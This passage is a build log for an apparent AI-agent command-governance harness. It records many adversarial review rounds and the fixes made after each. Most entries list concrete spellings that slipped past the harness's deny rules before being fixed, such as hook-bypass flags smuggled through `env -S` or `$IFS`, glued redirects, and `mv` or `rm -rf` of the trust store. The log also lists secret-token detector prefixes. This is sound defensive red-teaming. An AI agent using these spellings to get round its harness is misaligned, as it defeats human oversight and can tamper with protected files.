# Build log

One entry per phase (baseline section M, item 20). Every entry records the four check lines exactly as they stand:
`DETERMINISTIC CHECKS`, `IN-SESSION REVIEW`, `INDEPENDENT-AGENT REVIEW`, `CONFORMANCE`. An in-session review never
substitutes for an independent-agent review; a deferred check is never marked passed.

## Phase 0 — repository skeleton, toolchain, frozen baseline (commit b9434b3, 2026-09-11)

- DETERMINISTIC CHECKS: PARTIAL — typecheck and prettier config PASSED; the lint target committed at this phase
  (`eslint packages scripts`) in fact exits 2, because `scripts/` holds only `.mjs` files and the flat config
  ignores `**/*.mjs`, so eslint is handed no lintable file and errors. Corrected in phase 1 to `eslint packages tests`
  (exit 0). This line is recorded PARTIAL, not PASSED: the original claim was wrong and is left visible rather than
  rewritten, per "honest over fake parity / never mark a check passed that did not pass".
- IN-SESSION REVIEW: PASSED
- INDEPENDENT-AGENT REVIEW: DEFERRED_BUDGET (subagent budget exhausted at the time; re-run folded into the phase 1 review below)

#### Rounds 13-15 (2026-09-22)

| Round | Instrument | Claimed | Confirmed | Fix commits |
|------:|---|--------:|----------:|---|
| 13 | 14 adversarial clusters with shared reproduction probes | 76 | 61 | `fbf8643`, `c4c64e6` |
| 14 | the same 14 clusters | 94 | 76 | `703ba13`, `cd08a98` |
| 15 | the same 14 clusters, so the count is comparable | 84 | 67 | `356ff2c`, `fc68ca9` |

Every confirmed finding of rounds 13-15 was fixed and pinned; re-probing both corpora against HEAD reports zero
reaching ALLOW (44 land on ASK, 23 on DENY for round 15). Round 15's findings were classified A/B/C/D per the
product owner's instruction: 14 regressions, 23 generalizable classifier defects, 29 enumeration-tail cases mapped to
the containment requirement on issue #26, and 1 non-bypass.

A further **independent challenge of the new layered contract** (not of the shell-syntax surface) ran on 2026-09-22
and confirmed **22 findings against the contract itself**, 17 of them HIGH. They are unresolved. Phase 1 therefore
does NOT meet exit-criterion point 10 and is not complete.
*(Correction, 2026-10-07: true when written. The challenge rounds that followed in the same sitting (2–12, recorded
under the phase-1 check lines) fixed them; the register of 2026-10-01 records the 83 findings of challenge rounds
10–12 as NOT_REPLAYABLE — severity kept, command not — rather than as closed. Phase 1 closed on 2026-10-07 under the
amended criterion: see "Phase 1 — closure record" at the end of this file.)*

- CONFORMANCE: NOT RUN (nothing to conform yet)

## Phase 1 — kernel core (2026-09-14 → 2026-09-15; local commits 257e2d9, ff122a0, and the round-3 fix commit)

Scope delivered: control-plane parser and loader (fail-closed), policy compiler and compiled authority table with lock
tiers (Q98), authority evaluation with effect-based and path-aware command classification (package scripts, shell
scripts, make targets, `find -exec`, substitutions, wrappers, global option flags, aliases, environment injection,
redirections and copy/archive destinations, `cd` tracking), execution budgets with per-step retry hard stop,
containment catalogue, host capability matrix, trust classes, redaction, neutral hook model with `claude-code` and
`codex-cli` dialects (Codex fail-closed until conformance), runtime root (stamp, sessions with a pid-aware lock,
redacted ledger), launcher (index-first dispatch, cross-name IDENTITY_CONFLICT, `ego.node` floor, Q96 gate on both the
in-process and the delegation path, in-process equal run, dynamic-import delegation), launcher set (`version`, `sync`
from cache and `file:` sources, `distribution import|verify` with manifest-bound signatures, `bootstrap doctor
[--reverify]` naming the launcher's own conflicts), immutable cache verified over every byte, index with state
clearing on re-established trust, trust store seeding and at-least-one-key verification, pin with `--repin` as a human
act, `init` (authored templates kept apart from generated artifacts, standing-rules source tracking, husky and
custom hooks-directory support, refusal of machine-wide `core.hooksPath`), `doctor` (host-determined containment,
honest INPUT_CALLER_UNVERIFIED / CHANNEL_UNVERIFIED lines), `check`, `status`, `help`, `capabilities`,
`explain capability`, `modes`, `context explain`, `sources`, `budget extend`, `redact`, git hook shims (pre-commit
secret scan, pre-push scan of every pushed commit including merges and `--text`, chained pre-existing hooks with a
captured stdin), POSIX fail-closed shims.

Explicitly deferred (the CLI says so instead of faking): `upgrade`, `rollback`, remote source adapters (npm, HTTPS,
GitHub Release), `distribution bundle` (phase 6); tasks, held scopes, forge, workspace registry (phase 2); skills,
catalog, `ask` (phase 3); grilling, evidence, benchmark (phase 4); policies, stakeholder packs, decisions (phase 5);
deterministic prompt-hook caller verification (phase 6 conformance, K14 / open item 13).

September 2026 alignment applied in this phase: see `docs/architecture/alignment-2026-09.md` (24 items classified;
Q98 opened and implemented under the recommended default, awaiting confirmation).

### Independent-agent review record

- **Round 1** (workflow `ego-phase1-independent-review`, 7 reviewers, 2 refuters per finding): 66 raw findings,
  49 confirmed (10 HIGH), 9 unverified when the session limit interrupted the refuters, 8 refuted. Every confirmed
  finding was fixed and pinned by a test before round 2.
- **Round 2** (workflow `ego-phase1-review-round2`, one skeptic per round-1 finding, 2 refuters per unverified and
  fresh finding, 3 fresh adversarial reviewers, conformance audit): 15 of 48 fixes verified complete; 33 reported a
  sideways variant of the same class or a missing test; of the 9 unverified round-1 findings 8 were refuted and 1
  confirmed (LOW); 18 fresh findings (5 HIGH: `find -exec`, process substitution, glob/archive routes into `.harness/`,
  tool-less PreToolUse payloads answering ALLOW, machine-wide `core.hooksPath` pollution; plus the chained pre-push
  hook consuming git's stdin). Every confirmed residual and fresh finding was fixed and pinned by a test (see
  `packages/kernel/test/bypass.test.ts`, `hooks.test.ts`, `control-plane.test.ts`, `launcher.test.ts`,
  `tests/integration/cli.test.ts`) before round 3.
- **Round 3** (workflow `ego-phase1-review-round3`, one skeptic per open round-2 finding, 2 fresh reviewers with
  double verification, conformance and build-log audit; two launches were lost to the session and credit limits and a
  third completed all 83 agents): of 52 open findings 19 were verified fully fixed, the rest reported a sideways
  variant of the same class; 14 fresh confirmed findings, plus one HIGH conformance defect (D1: an agent could write
  the organization or overlay policy file the hook compiles from, widening authority on the next call). Every
  confirmed HIGH and MEDIUM was fixed and pinned by a test this round:
  - **Effect evaluation** (`evaluate.ts`): the shell tokenizer removes backslash escapes; command and process
    substitution bodies are quote-aware; `env` and every transparent wrapper (`chrt`, `taskset`, `setsid`,
    `cpulimit`, `flock`, `timeout -s`, …) surface their environment injections and never mask the wrapped command;
    `xargs -I`/`-J` replace strings no longer de-anchor the payload; a locked verb carried in argument position
    through an unknown launcher is found; write destinations are resolved after `cd`, through the destination flags of
    `cp`/`cpio`/`tar`, and a `ln` target or an archive extracted into a directory containing a protected tree is
    caught; path globs match case-insensitively; nested `.git` and `.husky` are protected; `find … -delete` is a
    scoped deletion, not a whole-tree wipe; Grep/Glob/LS over a credential store or HOME are denied.
  - **Authority never widens from the working tree** (D1, `policy/cache.ts`): a hook applies a layer edit that
    narrows at once, but an edit that widens anything is clamped to the last human-accepted table and recorded as
    pending; only `ego init` from a human terminal accepts it. `policies/organization/**` and `.harness/mcp-trust.md`
    are protected paths; `ego init --profile`/`--task-source` on a pinned project is refused from an agent shell.
  - **Budgets and modes** (`hooks/handle.ts`): a budget breach or retry cap never turns a DENY into an ASK; the
    session-record mode is honoured only when it exists in the compiled table (EGO_MAINTENANCE only in the EGO
    repository); the iteration counter resets only on a real session start.
  - **Git hooks** (`githooks.ts`, `git-hook.sh`): one chaining shim in every layout (default, custom `core.hooksPath`,
    husky), so a pre-existing hook keeps its stdin and its language and a missing shim in a pinned checkout fails
    closed; the pre-commit scan lists NUL-separated names and includes type changes; the pre-push scan excludes only
    known dependency lockfiles.
  - **Diff, loader, launcher, misc**: the authority diff covers grant phrases, protected paths, pre-denied classes
    and new mode cells (all MAJOR); the loader rejects a capability bullet without a checkbox and a null `narrow`; a
    symlink planted in the immutable cache fails verification; the session lock breaks a dead holder's lock by rename;
    the release build refuses an untagged or dirty tree; the Azure DevOps `*.visualstudio.com` remote parses correctly.
- **Round 4** (workflow `ego-phase1-review-round4`, one skeptic per open round-3 finding, fresh adversarial reviewers,
  conformance + build-log audit): of the round-3 fixes, 19 were verified fully fixed; the rest reported a sideways
  variant of the SAME class rather than a new class, plus fresh confirmed findings. Eight confirmed items (2 HIGH,
  4 MEDIUM, 2 LOW) were fixed and pinned this round:
  - **`env -S` / `--split-string`** (HIGH, `evaluate.ts`): the wrapper no longer swallows the split-string value as an
    opaque option; it re-tokenizes the value as leading `NAME=value` assignments plus the inner command and classifies
    it, so `env -S "git push origin main"` and the `--split-string=` form deny like `env -- …` and `bash -c`.
  - **File-loaded GraphQL mutation** (HIGH, `matchers.md`): a `gh|glab api graphql` whose body is loaded from a file or
    stdin (`field=@path`) can no longer be proven a read, so it routes to `forge.api.mutate` (DENY) instead of falling
    through to `forge.repo.read`; inline read queries are unaffected.
  - **Glued short forge fields** (MEDIUM, `matchers.md`): the field-flag separator accepts the glued `gh api -ftitle=x`
    spelling gh/cobra accept, closing the `-f`/`-F` mutation route that required a space or `=`.
  - **`pax` copy destination** (MEDIUM, `evaluate.ts`): pax copy mode writes to its LAST operand (the destination
    directory), like `cp`/`mv`; only `cpio -p` takes its sole operand. `pax -rw src .harness/generated` now denies.
  - **Carried `sh -c` body** (MEDIUM, `evaluate.ts`): `find -exec` / `xargs -I` / `parallel` payloads are re-quoted
    before re-tokenization, so a carried `sh -c "git push"` body survives and is classified.
  - **Chained hooks on a spaced path** (MEDIUM, `git-hook.sh` + `githooks.ts` `shimScript`): the chained hook is invoked
    as a quoted path, not an unquoted `run=` string, so a hooks directory whose path contains a space no longer
    word-splits (which had silently skipped the user's hook and aborted every commit/push).
  - **`git merge -n`** (LOW, `matchers.md`): `-n` means `--no-stat` for merge, not `--no-verify`; the hook-bypass
    matcher now scopes the `-n` short form to `git commit` and keeps `--no-verify` for push/merge, removing the false
    DENY on an ordinary `git merge -n`.
  - **Retry hard stop** (LOW, `handle.ts`): the failure-map eviction never drops a step that has already reached its
    retry cap (it evicts the least-failed uncapped key), and the step key is normalised (whitespace, trailing
    separators, trailing comments) so cosmetic variants of a capped command stay capped.
  Also this round: the Phase 0 lint check line was corrected to PARTIAL (the committed `eslint packages scripts`
  target could not pass), and the delegated-entry latency claim was corrected — only the in-process kernel path is a
  sub-60 ms budget; the delegated entry path is bounded by a contention-robust ceiling, not asserted at 60 ms. Every
  fix above is pinned by a test (`bypass.test.ts` round-4 residuals, `control-plane.test.ts` CommonMark `+`,
  `hooks.test.ts` retry-stop normalisation and no-evict-cap, `githooks.test.ts` spaced-path chained hook).
- **Round 5** (workflow `ego-phase1-review-round5`, 48 agents: cluster skeptics per round-4 fix plus fresh adversarial
  reviewers, each finding reproduced by two adversarial refuters before it counted): the six round-4 fixes all HELD,
  but the pass surfaced 19 confirmed findings — mostly sideways variants of the same classes one step out, plus
  pre-existing gaps earlier rounds had not reached. 15 HIGH / 2 MEDIUM / 2 LOW, every one fixed and pinned this round:
  - **Inline-interpreter body writes** (2 HIGH + 1 MEDIUM, `matchers.md`): `node -e` / `python -c` / `ruby -e` / `perl`
    whose body NAMES a protected store (`~/.ssh`, `~/.ego/trust`, `.git/hooks`, `.harness/generated`) was ASK
    `command.interpreter-inline`; it now fails closed to the same deny the literal `cp`/`tee` receives
    (credential-store, trust, hook-config, git-internals, harness-runtime). Ordered before `command.interpreter-inline`
    because `classifyNormalized` takes the first matching matcher.
  - **Archive-create destinations** (2 HIGH, `evaluate.ts`): `tar -cf <archive>` (create) and `pax -w -f <archive>`
    write the archive path; the destination resolver treated tar as extract-only (`-C`) and pax as last-operand, so a
    write into `.harness/generated` / `.git/hooks` was ALLOW/ASK. A mode-aware resolver now takes the `-f`/`--file`
    operand (including combined `-cf`/`-wf`) as the write in create/write mode.
  - **`mv` source containment** (1 HIGH, `evaluate.ts`): `mv .harness /tmp` relocates the whole control tree at ALLOW —
    only the destination was checked. `mv`/`rename` now treat every operand as a write (the source is removed).
  - **EGO_HOME trust dir node** (2 HIGH + 1 MEDIUM, `evaluate.ts`): the trust-store check required a strict descendant
    (`<home>/trust/…`), so `mv ~/.ego/trust /tmp`, `cp -r ~/.ego/runtimes …` and `rm -rf ~/.ego/releases` escaped; the
    directory node itself now counts, across trust/index/releases/runtimes.
  - **`env -S` leading option** (1 HIGH, `evaluate.ts`): `env -S "-u X git push"` began the split value with env's own
    option, which the re-parser took as the command head → ASK. The split value is now re-parsed through a synthetic
    `env` so its leading options/assignments are stripped and the real command is classified.
  - **Glued redirection** (1 HIGH, `evaluate.ts`): `echo x>.harness/generated/policy.json` (no space) was not seen as a
    redirect; the target scanner now un-glues an operator stuck to the preceding word.
  - **Multi-token `cd`** (1 MEDIUM, `evaluate.ts`): `cd -- .harness/generated && cp …` desynced the tracked cwd; the cd
    parser now skips `--` and options and takes the last positional.
  - **File-loaded GraphQL via `--input`/`-i`** (1 HIGH, `matchers.md`): the round-4 `=@` fix missed `--input`/`-i -`;
    both now route a graphql body to `forge.api.mutate`.
  - **Combined `git commit -nm`** (1 MEDIUM, `matchers.md`): `-nm` parses as `-n -m` (`--no-verify`); the hook-bypass
    matcher now matches a short-flag cluster containing `n`.
  - **Missing production verbs** (1 HIGH k8s + 1 MEDIUM cloud, `matchers.md`): `kubectl … debug|certificate` and more
    state-changing `aws` verbs (EC2 lifecycle, `s3 rm`, `lambda invoke`, …) are added to the production matchers.
  - **Pre-push decoy ref** (1 MEDIUM, `githooks.ts`): the new-branch scan used `--not --remotes`, and a planted
    `refs/remotes/origin/*` hid a secret; it now excludes only the remote SHAs git itself reports for the push
    (unforgeable), scanning the branch in full when there is no trustworthy baseline.
  - **Retry-stop no-op escape** (1 LOW, `handle.ts`): `npm test;#1` / `&& :` / `|| true` / `{ … }` minted fresh retry
    keys; the key now normalises to the first command of the line. No authority is granted either way.
  - **Ordered-list deny vanish** (1 LOW, `load.ts`): a capability written with an unsupported marker (`1.`/`1)`) parsed
    as prose and disappeared with no error; the loader now fails closed on a mislaid capability declaration.
  Each fix is pinned (`bypass.test.ts` round-5 residuals, `control-plane.test.ts` ordered-list, `hooks.test.ts`
  retry no-op, `tests/integration/cli.test.ts` planted-ref pre-push). Suite: 135 tests.
- **Round 6** (workflow `ego-phase1-review-round6`, 42 agents, adversarial refutation): the round-5 fixes held; 16
  confirmed findings surfaced (13 HIGH/MEDIUM, 3 LOW) — sideways variants of the round-5 classes plus deeper
  pre-existing gaps. All fixed and pinned:
  - **Sideways archivers** (2 HIGH + 1 MEDIUM, `evaluate.ts`): `zip` had no write-destination branch; `bsdtar`/`gtar`
    were absent from WRITE_HEADS; tar extract honoured only `-C`, not `--directory`/`--cd`. All now resolve the
    archive/extract destination and DENY into a protected tree.
  - **Trust store via glob / parent** (1 HIGH + 1 MEDIUM, `evaluate.ts`): `rm -rf ~/.ego/*`, `~/.ego/trust*`,
    `~/.ego/trus[t]` and a recursive `cp -r ~/.ego` escaped the strict-descendant check; a glob/parent reachability
    guard now denies them (`reachesTrustStore`).
  - **Glued-digit redirect** (1 HIGH, `evaluate.ts`): `echo x2>PATH` (a word ending in a digit glued to `>`) is
    un-glued and classified as a write.
  - **ANSI-C quoting** (1 HIGH, `evaluate.ts`): the tokenizer now expands `$'...'` (`$'delete'`, `$'\x70ush'`), so a
    locked verb hidden in ANSI-C quoting is seen.
  - **Inline-interpreter newline** (1 HIGH, `matchers.md`): the body matchers' trailing wildcard is now newline-tolerant
    (`[\s\S]*`), so a newline before the protected path no longer downgrades the deny. (Fully-obfuscated bodies —
    string concatenation, char-codes — still reach ASK, the human gate; that floor is by design, not a silent ALLOW.)
  - **GraphQL from a variable/substitution** (1 HIGH, `matchers.md`): an opaque `gh api graphql -f query=$VAR` / `=$(…)`
    body cannot be inspected, so it fails closed to `forge.api.mutate`.
  - **AWS S3 verbs** (1 MEDIUM, `matchers.md`): `s3 rm|mv|cp|sync|rb|mb` and s3api/ecr mutations added to
    `production.cloud.mutate`.
  - **`git commit -nm` precision** (1 LOW→fixed as correctness, `matchers.md` + `evaluate.ts`): the message-scanning
    matcher is replaced by a quote-aware evaluator check, so a combined `-nm`/`-nam` denies but a `-n` inside the `-m`
    message does not (removes a false-positive DENY while keeping the bypass caught).
  - **`.harness/hooks/**` on the file tool** (1 MEDIUM, `matchers.md`): the enforcement shims are the absolute
    `ego.runtime.tamper` on Write/Edit too, not the weaker `fs.hook-config.write`.
  - **Retry-stop leading no-op** (1 LOW, `handle.ts`): the key now normalises to the first REAL command, so a prepended
    `: ;`/`true &&`/`x=1 ` no-op cannot mint a fresh key either.
  - **Malformed checkbox** (1 LOW, `load.ts`): a bullet with a malformed checkbox (`- [-]`, `- [~]`, `- [ x]`) fails
    closed instead of silently dropping the capability.
  - **EGO_MAINTENANCE spoof** (1 MEDIUM, `handle.ts`): the mode is gated on the unforgeable signal that the running
    kernel's control-plane lives inside the repo (`pathInside`), not on package files an agent can forge.
  - **Worktree fail-open** (1 MEDIUM, `githooks.ts`): a linked worktree's shim now resolves `.harness` in the main
    worktree via the git common dir, so governance runs (it previously fell through to "not governed").
  Each fix is pinned (`bypass.test.ts` round-6 residuals; `control-plane.test.ts` malformed-checkbox; `hooks.test.ts`
  retry-prepend + maintenance-spoof; `githooks.test.ts` linked-worktree). Suite: 140 tests.
- **Round 7** (workflow `ego-phase1-review-round7`, adversarial refutation, with an explicit floor rule: an opaque
  command reaching ASK is the designed human gate, not a bypass — report only reaches to ALLOW or a concrete missed
  DENY spelling): **incomplete — the session usage limit interrupted 13 of 16 agents** (all four fresh surfaces, three
  verify clusters, and every refuter). The three verify clusters that finished each reported one HIGH reach to ALLOW,
  which the interrupted refuters could not vote on; all three were reproduced by hand and fixed and pinned:
  - **Dash-less tar** (HIGH, `evaluate.ts`): traditional `tar xf`/`cf`/`czf` (function letters with no leading `-`) was
    not recognised as create/extract, so `tar cf .harness/generated/x a` and `tar xf a -C .harness/generated` reached
    ALLOW. The resolver now reads the dash-less mode operand and its archive (tokens[2]).
  - **`mv` of the EGO_HOME parent** (HIGH, `evaluate.ts`): `mv <EGO_HOME> /tmp` relocates the whole trust tree without a
    recursive flag and reached ALLOW; `mv`/`rename` are now treated as whole-tree ops in the trust-parent guard.
  - **`git commit` bypass via a carrier** (HIGH, `evaluate.ts`): `env -S 'git commit -nm x'`, `--split-string=…` and
    `bash|sh -c '…'` hid the hook-bypass flag in a quoted value; the quote-aware check now scans the carrier's inner
    command too (`env -S 'git commit -m "fix -n"'` still correctly ALLOWs).
  Pinned by `bypass.test.ts` round-7 residuals. This round is NOT a clean pass: the fresh surfaces (redaction,
  budgets/cache, launcher/exec-contract, containment) and the remaining verify clusters were not run. Round 8 re-runs
  them once the usage limit resets. Suite: 141 tests.
- **Round 8** (workflow `ego-phase1-review-round8`, 23 agents ran to completion, adversarial refutation with the floor
  rule): 6 confirmed findings (3 HIGH, 3 MEDIUM), each reproduced and fixed and pinned:
  - **tar write modes** (HIGH, `evaluate.ts`): append (`r`/`--append`), update (`u`/`--update`) and catenate (`A`)
    write the archive but were not classified as writes (only create/extract were); and the dash-less blocking-factor
    spelling `tar cbf 20 ARCHIVE` put the archive at the wrong operand. The resolver now covers every write mode and
    computes the dash-less archive operand from the function letters that consume an argument.
  - **Quoted commit hook-bypass flag** (HIGH, `evaluate.ts`): `git commit "-n" -m x` / `-n"m"` / `-"n"` were skipped
    because the check ignored every quoted token. It now dequotes and parses the short-flag cluster properly (`n`
    before any `m`/`F` = --no-verify), and skips only the value token a `-m`/`-F` actually consumes — so `-mn` /
    `-mfoon` / `-m "-n"` stay ALLOW while the quoted bypass denies.
  - **Multi-digit glued redirect** (HIGH, `evaluate.ts`): the round-7 un-glue split a word ending in two or more
    digits (`echo x12>PATH`), so the target scanner missed it; it now un-glues only the operator, keeping the digits
    with the word.
  - **Password-span redaction leak** (MEDIUM, `redact.ts`): a captured DB/URL password equal to the username or scheme
    (`postgres://admin:admin@…`) was redacted at the wrong occurrence, leaving the raw secret in the returned text and
    thus the ledger. Redaction now splices the exact captured span using match indices.
  - **Slack token coverage** (MEDIUM, `secrets/saas-ai.md`): app-level `xapp-` and refresh `xoxe-` tokens are now
    blocked like `xoxb-`/`xoxp-`.
  - **Control-plane write matcher** (MEDIUM, `matchers.md`): `control-plane/**` and the `policies/{baselines,frameworks,
    schemas,templates}/**` baselines had no file-tool matcher, so an in-repo agent could rewrite the EGO authority
    baseline (Write/Edit or shell) at ALLOW; they now map to `ego.control-plane.edit` (DENY outside
    EGO_MAINTENANCE), which also covers shell writes via the containment check.
  Pinned by `bypass.test.ts` round-8 residuals and `redact.test.ts` round-8 cases. Suite: 144 tests.
- **Round 9** (workflow `ego-phase1-review-round9`, 31 agents, complete run, adversarial refutation): 10 confirmed
  findings (7 HIGH, 3 MEDIUM), each reproduced and fixed and pinned. Most were secret-detector coverage gaps:
  - **Secret-scan coverage** (`secrets/*.md`): npm (`npm_…`), PyPI (`pypi-…`), Azure `SharedAccessKey=` (Service Bus /
    Event Hub / IoT, alongside the existing `AccountKey=`), DigitalOcean (`dop_v1_`/`doo_v1_`/`dor_v1_`) and Docker Hub
    (`dckr_pat_`) tokens are now block-severity detectors.
  - **`>|` noclobber redirect** (`evaluate.ts`): `splitShellSegments` split on the `|` of `>|`, severing the write
    target; it no longer splits a `|` preceded by `>`, so `echo x>|.harness/generated/…` denies like `>`/`>>`.
  - **Commit `$IFS` splice** (`evaluate.ts`): `git commit -n$IFS -m x` / `-n${IFS}` / `-n$""` reconstruct a bare `-n`
    at the shell; the commit scan now models `$IFS` field-splitting and empty `$`-expansions before the cluster test
    (and correctly skips a message consumed by a cluster ending in `m`/`F`, so `-am`/`-qm` messages stay ALLOW).
  - **`.git` gitlink file** (`matchers.md`): the DENY matcher guarded only `.git/` contents, so overwriting the `.git`
    pointer FILE of a worktree/submodule (repointing all internals and hooks) reached ALLOW; `**/.git` is now protected.
  - **Nested host hook config** (`matchers.md`): `.claude/settings.json`, `…local.json` and `.codex/**` were matched
    only at a registered repo root; they now carry the `**/` prefix like `**/.git/hooks/**`, so a nested copy in a
    monorepo package is protected too.
  Pinned by `bypass.test.ts` round-9 residuals and `redact.test.ts` round-9. Suite: 146 tests.
- **Round 10** (workflow `ego-phase1-review-round10`, 33 agents, complete run, adversarial refutation): 13 confirmed
  findings (8 HIGH, 5 MEDIUM), each reproduced and fixed and pinned. Nine were secret-detector provider gaps; the
  taxonomy was broadened once (new file `control-plane/secrets/more-providers.md`) with distinctive-prefix detectors
  for Databricks, Shopify, Terraform Cloud, New Relic, Grafana, Square, Google OAuth (`GOCSPX-`), Stripe webhook
  (`whsec_`), plus a get-ahead batch (GitHub fine-grained/app tokens, Linear, Notion, Figma, Doppler, PlanetScale,
  Sentry). The other four:
  - **Commit `${IFS%?}` splice** (HIGH, `evaluate.ts`): the round-9 `$IFS` fix missed parameter-expansion trims
    (`${IFS%?}`, `${IFS#?}`, `${IFS:0:1}`, `${x:- }`, `${#}`); the scan now replaces every `$`-expansion in a flag token
    with a separator before the cluster test.
  - **`>>|` redirect** (MEDIUM, `evaluate.ts`): the target scanner recognised `>|` but not `>>|` (append + noclobber
    override); the redirect regex now accepts an optional trailing `|` on `>`/`>>`.
  - **Symlinked `.git`** (MEDIUM, `evaluate.ts`): `matchPathPattern` tested only the realpath-resolved path, so a `.git`
    that is itself a symlink lost the name and a Write/Edit to `.git/config` or `.git/hooks/*` reached ALLOW; it now
    tests the lexical path too (still catching a symlink that points INTO a protected tree via the canonical path).
  - **Install lifecycle scripts** (HIGH, `evaluate.ts`): `npm install`/`ci`/`add` (and `pnpm`/`yarn`) run
    preinstall/install/postinstall/prepare, which were never effect-analysed; they are now, so a `postinstall` that
    pushes or mutates production escalates (a benign install stays a local mutation).
  Pinned by `bypass.test.ts` round-10 residuals and `redact.test.ts` round-10. Suite: 148 tests.
- **Round 11** (workflow `ego-phase1-review-round11`, 25 agents, complete run, adversarial refutation): the round-10
  fixes held; 9 confirmed findings (7 HIGH, 2 MEDIUM), each reproduced and fixed and pinned:
  - **Commit default-value expansion** (HIGH, `evaluate.ts`): `git commit -${x:-n}`/`${x:---no-verify}`/`${x:=n}`/`${x-n}`
    substitute the literal default at the shell; the scan now expands `${var:op word}` to its word before the check.
  - **`sh -euc` cluster** (MEDIUM, `evaluate.ts`): a combined short-flag cluster ending in `c` (`-euc`, `-ec`, `-lc`)
    is now recognised as the `-c` command flag, so the carried payload is classified (this also closes a related
    reach-to-ALLOW where a package script `sh -euc 'git push'` was opaque and swallowed by its declared build class).
  - **Cloud global option** (MEDIUM, `matchers.md`): a global option before the service/verb (`aws --profile prod iam
    delete-user`, `terraform -chdir=… apply`) defeated the positional production matchers; they now skip leading
    options.
  - **Tilde file paths** (HIGH, `evaluate.ts`): a literal `~/…` on the Read/Write/Edit tool was resolved to
    `<cwd>/~/…` inside the repo; `classifyPath` now home-expands it, so `~/.ssh/id_rsa` denies.
  - **make `-C DIR`** (HIGH, `evaluate.ts`): the change-directory argument was mis-parsed as a target (dropping the
    recipe analysis); make option arguments are now skipped and the Makefile is read from the `-C` directory.
  - **Install lifecycle list** (HIGH, `evaluate.ts`): the analysed set now matches the hooks npm actually runs on
    install — `prepublish`, `preprepare`, `postprepare`, `dependencies` — and drops publish-only `prepublishOnly`.
  - **More secret detectors** (HIGH, `secrets/more-providers.md`): Postman (`PMAK-`), Tailscale (`tskey-`), Supabase
    (`sbp_`), Atlassian (`ATATT3xFfGF0`).
  - **curl `-u` secret username** (MEDIUM, `redaction/curl.ts`): a long token-like `-u` username (e.g. a Stripe key in
    the username position) is now redacted, while a short human username is kept.
  Pinned by `bypass.test.ts` round-11 residuals and `redact.test.ts` round-11. Suite: 150 tests.
- **Round 12** (workflow `ego-phase1-review-round12`, 17 agents, complete run, adversarial refutation): the round-11
  fixes held; 5 confirmed findings (4 HIGH, 1 MEDIUM), each reproduced and fixed and pinned:
  - **Commit embedded empty expansion** (HIGH, `evaluate.ts`): an unset `${x}` VANISHES and glues fragments into a
    flag (`-${x}-no-verify` -> `--no-verify`, `-${x}n` -> `-n`); the scan now tests both a separator AND an empty
    substitution for residual expansions.
  - **make `-f` alternate makefile** (HIGH, `evaluate.ts`): `make -f ci.mk release` (and `--file=`/`-C DIR` `=` forms)
    never read the named makefile, so its recipe went unanalysed; the named makefile is now read.
  - **Write-capable "read-only" tools** (HIGH, `evaluate.ts`): `sort -o FILE`, `sort --output=`, `uniq IN OUT`,
    `yq -i FILE` write files but were classified read-only; they are now WRITE_HEADS with a resolved destination.
  - **`rm -rf $EGO_HOME` root** (MEDIUM, `evaluate.ts`): `rm`/`rmdir`/`shred` of the EGO_HOME root reached ASK; they
    now count as whole-tree ops in the trust-store reach check, so the root DENYs like its subdirs.
  - **AWS secret in JSON** (HIGH, `secrets/cloud.md`): a secret in `{"aws_secret_access_key":"…"}` / STS
    `{"SecretAccessKey":"…"}` slipped the context-keyed detector (closing quote before the colon); the key/value
    separator now allows the quote and the camelCase STS key.
  Pinned by `bypass.test.ts` round-12 residuals and `redact.test.ts` round-12. Suite: 152 tests.
- **Round 13**: an independent re-verification of the round-12 fixes is pending; recorded here when it completes.
- **Incident during round 2** (found 2026-09-15 when the checkpoint commit failed): EGO git hooks had been written
  into this repository's own `.git/hooks` at 02:17, pointing at a shim that does not exist here, so every commit
  failed. No pre-existing hook was displaced. Cause: `installGitHooks` accepted a directory that was not a git
  toplevel, and git resolved the hooks path upward to the enclosing repository. The stray hooks were moved to the
  session scratchpad, and `installGitHooks` now refuses any directory that is not the top level of its own
  repository (pinned by `packages/kernel/test/githooks.test.ts`).

### Check lines

*(These four lines are the record as it accreted from 2026-09-15 to 2026-09-30, corrections included; they are kept
as history. The lines in force at closure are in "Phase 1 — closure record (2026-10-07)" at the end of this file.)*

- DETERMINISTIC CHECKS: PASSED — `npm run typecheck`, `npm run lint` (packages and tests), `node --test`
  (152 tests), `npm run build` (dist/ego.js, development identity `-dev.<sha>.dirty`, built from the uncommitted
  phase-1 tree; the release build refuses a dirty or untagged tree). Hook latency, stated honestly by path:
  - The **in-process kernel path** (the K26/Q19 budget: `handleHook` with an already-compiled authority table) is
    pinned under 60 ms by `packages/kernel/test/hooks.test.ts` (min-of-N, ~25 ms). This is the budget the design
    claims, and it holds under full-suite parallel load.
  - The **delegated-entry path** (a hook served by a cached runtime of a different identity through the exec
    contract) is NOT a sub-60 ms path and is no longer claimed as one. After the first (cached) dynamic import it
    still re-runs the pinned bundle's whole `main()` — self-identity, index, control-plane load + compile, the
    kernel, and the session/ledger writes — i.e. the same work a fresh process does. In isolation its floor lands
    under 60 ms, but because `node:test` runs every test file in parallel it inflates to ~70–90 ms under
    full-suite CPU contention. `tests/integration/cli.test.ts` therefore pins it under a generous, contention-robust
    250 ms ceiling (min-of-N) that catches a real regression (a re-parse per call, an O(n) blow-up) without asserting
    the kernel budget on a path that legitimately does more than the kernel.
  - Process wall-clock through `node dist/ego.js hook`, including Node start-up, is 70–80 ms: above 60 ms at the
    process level, reported as such, and not the kernel budget.
  (An earlier revision of this line claimed both the in-process and the delegated path were "pinned under 60 ms";
  that was wrong for the delegated path and is corrected here rather than left standing — honest over fake parity.)
- IN-SESSION REVIEW: PASSED — smoke-tested init → hooks → status → check → doctor → delegation on temporary
  repositories; every round-1/2/3 finding reproduced before being fixed; the D1 policy-widening defect verified closed
  end to end against the built bundle.

  **Corpus reorganized by root semantic class (2026-09-24), and it immediately found two floor crossings.** The
  regression corpus was a list of literal spellings in the order the defects arrived: it proves past bugs stay
  fixed and says nothing about a NEW spelling of an old effect. It is now twenty ROOT SEMANTIC CLASSES, each with
  an authority FLOOR, crossed with 32 effect-preserving transformations and 14 producers — the variants are
  generated, not enumerated (`packages/kernel/test/support/corpus.ts`, `corpus.test.ts`, `monotonicity.test.ts`).
  Writing it surfaced two defects that twelve adversarial rounds had not:
  1. **A shell script's body was classified as its first command only.** `analyzeSegments` split a unit into
     segments only for ISOLATED shells (make recipe lines, npm pre/post). A script is ONE shell, so its lines were
     passed through whole: `echo "$(git push origin main)"` in a `.sh` was an `echo` (ALLOW), and so was
     `echo start; git push origin main`. Every producer that hands over whole lines was affected. Splitting now
